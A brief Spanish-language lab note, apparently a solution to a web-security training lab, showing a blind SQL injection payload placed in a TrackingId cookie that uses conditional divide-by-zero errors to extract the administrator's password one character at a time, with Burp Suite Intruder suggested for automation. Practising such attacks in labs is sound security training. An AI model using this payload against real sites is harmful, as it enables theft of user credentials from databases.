# Blind SQL injection with conditional errors

Se hace con esta iyección: `Cookie: TrackingId=WoSUZWCmUB65z08c' AND (SELECT CASE WHEN (username = 'administrator' AND SUBSTR(password, 21, 1) = '§r§') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE ROWNUM = 1) = 'a;`

Es recomendable usar el `intruder` de `Burp Suite` para automatizar el proceso.